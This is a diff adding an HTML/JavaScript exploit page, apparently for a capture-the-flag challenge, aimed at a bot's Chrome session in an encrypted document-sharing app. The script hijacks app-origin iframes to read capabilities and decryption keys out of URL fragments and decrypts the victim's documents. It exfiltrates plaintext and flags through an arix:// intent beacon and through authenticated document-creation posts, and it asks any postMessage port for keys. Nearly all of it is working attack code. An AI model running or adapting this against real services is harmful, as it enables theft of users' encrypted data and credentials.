@@ -1,0 +1,295 @@
+<!doctype html><html><head><meta charset="utf-8"><title>r</title></head><body>
+<pre id="log"></pre>
+<script>
+(function () {
+  "use strict";
+  /* ------------------------------------------------------------------ config
+     shot.py substitutes these before upload.  Everything else is static. */
+  var T        = "@@TOKEN@@";
+  var TARGETS  = @@TARGETS@@;
+  var LANES    = @@LANES@@;
+  var DEADLINE = @@DEADLINE@@;
+
+  var RUN = (/[#&]r=(\d+)/.exec(location.hash) || [0, "0"])[1];
+  var TAG = "@@TAG@@" + "r" + RUN;
+  var API = "https://ariadnetab.xyz/api/";
+  var APP = "https://ariadnetab.xyz";
+  var CONTENT = "https://content.ariadnetab.xyz";
+  var IV = "AAAAAAAAAAAAAAAA";
+  var WK = new Array(513).join("A");
+  var n = 0;
+  var t0 = Date.now();
+
+  /* ------------------------------------------------- channel 1: arix:// beacon
+     Chrome turns a navigation to an unknown scheme into an Intent for whichever
+     app claims it; Recv in our APK claims `arix` and logs getDataString() under
+     the TFCCTF tag, so a beacon lands in the platform log DURING the run.
+
+     What is actually MEASURED, after getting this wrong twice:
+       - desktop Chrome 152 refuses the launch outright: "Not allowed to launch
+         ... because a user gesture is required" (payval.py).
+       - Android Chrome on the emulator DOES fire it from a scripted top-level
+         navigation with no gesture (session t11, `PAGE r1 17ms [boot 0of1]`),
+         but it ALSO commits away from our document and killed that run 20 ms in.
+     So this is a BEST-EFFORT SIDE CHANNEL fired from a disposable iframe, never
+     from location. The document channel below is the one that must work. */
+  var beaconQueue = [];
+  var beaconBusy = false;
+  var beaconSeq = 0;
+
+  /* Mirror every beacon into the DOM as well. Costs nothing on the emulator and
+     it is what payval.py reads to validate this page offline, in a browser where
+     `arix://` has no handler and the beacon is a no-op. */
+  var mirror = document.getElementById("log");
+  var mirrorLines = [];
+  function mirrorAdd(kind, text) {
+    mirrorLines.push((Date.now() - t0) + "|" + kind + "|" + text);
+    if (mirror) mirror.textContent = mirrorLines.join("\n");
+  }
+
+  /* MEASURED on session t11: Android Chrome DOES fire the intent from a scripted
+     top-level navigation with no user gesture (desktop Chrome 152 refuses it),
+     but it also COMMITS AWAY from our document, which killed the run 20 ms in.
+     So never touch location. Spend a disposable iframe instead: if Android
+     Chrome allows a subframe external launch we keep the live channel, and if it
+     refuses we lose only the iframe while the document channel carries on. */
+  function beaconPump() {
+    if (beaconBusy || !beaconQueue.length) return;
+    beaconBusy = true;
+    var url = beaconQueue.shift();
+    try {
+      var sink = document.createElement("iframe");
+      sink.style.cssText = "width:0;height:0;border:0;position:absolute;left:-9999px";
+      sink.src = url;
+      document.body.appendChild(sink);
+      setTimeout(function () { try { sink.remove(); } catch (e) {} }, 400);
+    } catch (e) {
+      /* the document channel is the fallback and it is unaffected */
+    }
+    setTimeout(function () { beaconBusy = false; beaconPump(); }, 150);
+  }
+
+  function beacon(kind, text) {
+    var body = String(text);
+    mirrorAdd(kind, body);
+    var chunk = 900;                      /* stays clear of any URL length cap */
+    var parts = Math.ceil(body.length / chunk) || 1;
+    for (var i = 0; i < parts; i++) {
+      beaconQueue.push(
+        "arix://b/" + (beaconSeq++) +
+        "?k=" + encodeURIComponent(kind) +
+        "&r=" + RUN +
+        "&i=" + i + "of" + parts +
+        "&ms=" + (Date.now() - t0) +
+        "&d=" + encodeURIComponent(body.substr(i * chunk, chunk))
+      );
+    }
+    beaconPump();
+  }
+
+  /* ------------------------------------- channel 2: documents/create fallback
+     Proven, slow, and only readable after the run with `shot.py read`.  Kept
+     for the events that matter so a blocked beacon channel still yields data. */
+  function post(path, body) {
+    return fetch(API + path, {
+      method: "POST", keepalive: true,
+      headers: { Authorization: "Bearer " + T, "Content-Type": "application/json" },
+      body: JSON.stringify(body)
+    });
+  }
+  function b64(text) {
+    try { return btoa(unescape(encodeURIComponent(text))); } catch (e) { return btoa("enc-fail"); }
+  }
+  function docLog(message) {
+    var line = TAG + "|" + ("000" + (n++)).slice(-3) + "|" + (Date.now() - t0) + "|" + message;
+    if (line.length > 250) line = line.slice(0, 250);
+    post("documents/create", {
+      name: line, mime_type: "text/plain", ciphertext: b64(message), iv: IV, wrapped_key: WK
+    }).catch(function () {});
+  }
+
+  /* log() goes to BOTH channels.  keep() also mirrors into the fallback. */
+  function log(message)  { beacon("log", message); }
+  function keep(message) { beacon("log", message); docLog(message); }
+
+  window.onerror = function (m, s, l) { keep("ONERROR " + m + " @" + l); };
+
+  /* ------------------------------------------------------------- the CONTROL
+     Fired before anything else.  If `>>> Recv` with k=boot shows up in the
+     platform log then (a) our JS is executing on the content origin inside the
+     bot's Chrome and (b) the beacon channel is live.  If it never shows up the
+     channel is blocked and only the document fallback carries this run.  Either
+     way we KNOW which, which is the whole point of wiring this. */
+  beacon("boot", "href=" + location.href.slice(0, 200) +
+                 " targets=" + TARGETS.length + " lanes=" + LANES + " deadline=" + DEADLINE);
+  docLog("boot targets=" + TARGETS.length);
+
+  /* Any postMessage port Chrome hands this document, from any app: ask for the
+     key.  Costs nothing to leave in and would be decisive if it ever fires. */
+  window.addEventListener("message", function (event) {
+    keep("MSG origin=" + event.origin + " ports=" + (event.ports ? event.ports.length : 0));
+    var port = event.ports && event.ports[0];
+    if (!port) return;
+    port.onmessage = function (m) { keep("PORT " + String(m.data).slice(0, 800)); };
+    port.start();
+    try { port.postMessage(JSON.stringify({ id: 1, method: "key.get", params: {} })); keep("sent key.get"); }
+    catch (e) { keep("port send ERR " + e); }
+  });
+
+  /* ------------------------------------------------------------------ crypto */
+  function b64urlToBytes(value) {
+    var s = value.replace(/-/g, "+").replace(/_/g, "/");
+    while (s.length % 4) s += "=";
+    return Uint8Array.from(atob(s), function (c) { return c.charCodeAt(0); });
+  }
+  function b64ToBytes(value) {
+    return Uint8Array.from(atob(value), function (c) { return c.charCodeAt(0); });
+  }
+
+  /* POST /api/render is unauthenticated and not owner-scoped, so a capability
+     alone is enough to pull the envelope. */
+  function renderAndDecrypt(cap, rawKey) {
+    return fetch(APP + "/api/render", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ cap: cap })
+    }).then(function (response) {
+      if (!response.ok) throw new Error("render " + response.status);
+      return response.json();
+    }).then(function (envelope) {
+      return crypto.subtle.importKey("raw", rawKey, "AES-GCM", false, ["decrypt"])
+        .then(function (key) {
+          return crypto.subtle.decrypt(
+            { name: "AES-GCM", iv: b64ToBytes(envelope.iv), tagLength: 128 },
+            key, b64ToBytes(envelope.ciphertext));
+        }).then(function (plain) {
+          return { mime: envelope.mime_type, text: new TextDecoder().decode(plain) };
+        });
+    });
+  }
+
+  /* --------------------------------------------------------- the primitive
+     Frame the app origin at #/open/<uuid>.  app.js runs there with the bot's
+     localStorage and the bot's Auth0 cache.  On a hit it location.replace()s
+     THE FRAME onto our own content origin, at which point the frame is
+     same-origin and we read cap+key out of its fragment.
+
+     Per-probe telemetry, so a miss is not a silent zero:
+       loads  how many times the frame fired onload.  1 means the app-origin
+              document loaded and stayed put, which is what a wrong id looks
+              like.  >=2 with no same-origin read means app.js navigated the
+              frame somewhere that is not us, and the only thing it can navigate
+              to is Auth0, i.e. THE BOT IS NOT LOGGED IN.
+       maxlen high-water mark of frame.contentWindow.length, the one property
+              readable cross-origin.  Recorded, but NOT trusted as an oracle:
+              auth0-spa-js returns straight from its localStorage cache without
+              creating an iframe when the token is live, so 0 is uninformative.
+       ms     wall time to resolution. */
+  function probe(uuid, budgetMs) {
+    return new Promise(function (resolve) {
+      var frame = document.createElement("iframe");
+      frame.style.cssText = "width:1px;height:1px;border:0;position:absolute;left:-9999px";
+      var loads = 0, maxlen = 0;
+      frame.onload = function () { loads++; };
+      frame.src = APP + "/#/open/" + uuid;
+      document.body.appendChild(frame);
+
+      var started = Date.now();
+      var timer = setInterval(function () {
+        var href = null;
+        try { href = frame.contentWindow.location.href; } catch (e) { href = null; }
+        if (href && href.indexOf(CONTENT + "/") === 0) {
+          clearInterval(timer);
+          var frag = href.split("#")[1] || "";
+          var params = {};
+          frag.split("&").forEach(function (pair) {
+            var eq = pair.indexOf("=");
+            if (eq > 0) params[pair.slice(0, eq)] = decodeURIComponent(pair.slice(eq + 1));
+          });
+          frame.remove();
+          resolve({ uuid: uuid, ok: true, cap: params.cap, key: params.key,
+                    loads: loads, maxlen: maxlen, ms: Date.now() - started });
+          return;
+        }
+        var count = -1;
+        try { count = frame.contentWindow.length; } catch (e) { count = -2; }
+        if (count > maxlen) maxlen = count;
+        if (Date.now() - started > budgetMs) {
+          clearInterval(timer);
+          frame.remove();
+          resolve({ uuid: uuid, ok: false, loads: loads, maxlen: maxlen,
+                    ms: Date.now() - started });
+        }
+      }, 50);
+    });
+  }
+
+  /* ----------------------------------------------------------------- driver */
+  var queue = TARGETS.slice();
+  var hits = 0, done = 0, navAway = 0, healthy = 0;
+
+  function lane() {
+    if (!queue.length) return Promise.resolve();
+    var uuid = queue.shift();
+    return probe(uuid, DEADLINE).then(function (result) {
+      done++;
+      /* loads==1 is a healthy chain that simply does not own the id.
+         loads>=2 is app.js redirecting to Auth0, i.e. no usable bearer. */
+      if (!result.ok && result.loads >= 2) navAway++;
+      if (!result.ok && result.loads <= 1) healthy++;
+      if (!result.ok) {
+        log("miss " + uuid + " loads=" + result.loads +
+            " maxlen=" + result.maxlen + " " + result.ms + "ms");
+        return lane();
+      }
+      hits++;
+      keep("HIT " + uuid + " " + result.ms + "ms cap=" + String(result.cap).slice(0, 40));
+      return renderAndDecrypt(result.cap, b64urlToBytes(result.key)).then(function (doc) {
+        keep("PLAIN " + uuid + " " + doc.mime + " " + doc.text.length + "b");
+        beacon("body", doc.text.slice(0, 3000));
+        docLog("BODY " + doc.text.slice(0, 180));
+        var flag = /TFCCTF\{[^}]*\}/.exec(doc.text);
+        if (flag) { keep("FLAG " + flag[0]); beacon("flag", flag[0]); }
+      }).catch(function (error) {
+        keep("HITNODEC " + uuid + " " + error);
+        beacon("hitnodec", "cap=" + result.cap + " key=" + result.key);
+      }).then(lane);
+    });
+  }
+
+  /* Stagger lane starts. Ten simultaneous app-origin iframes, each a full app.js
+     boot plus an auth0 CDN fetch, is a plausible renderer OOM on an emulator and
+     is the other candidate cause of the t11 death. 400 ms apart costs almost
+     nothing against a 12 s deadline and flattens the spike. */
+  var lanes = [];
+  for (var i = 0; i < Math.min(LANES, TARGETS.length); i++) {
+    lanes.push((function (index) {
+      return new Promise(function (resolve) {
+        setTimeout(function () { lane().then(resolve); }, index * 400);
+      });
+    })(i));
+  }
+
+  Promise.all(lanes).then(function () {
+    keep("DONE hits=" + hits + " probed=" + done +
+         " healthyMiss=" + healthy + " navAway=" + navAway +
+         " queued=" + queue.length);
+  });
+
+  /* Heartbeat on BOTH channels.
+     The arix beacon is refused without a user gesture, so the document channel
+     is the one that actually reports; shot.py polls documents/list during the
+     run, which is what makes a session live rather than post-hoc.
+     healthyMiss vs navAway is the three-way discriminator: an all-miss session
+     with healthyMiss==probed means the chain worked and the ids were wrong,
+     while navAway>0 means the bot had no usable bearer and the run is void. */
+  var beats = 0;
+  setInterval(function () {
+    beats++;
+    keep("beat t=" + beats + " probed=" + done + " hits=" + hits +
+         " healthyMiss=" + healthy + " navAway=" + navAway +
+         " queued=" + queue.length);
+  }, 2500);
+})();
+</script>
+</body></html>
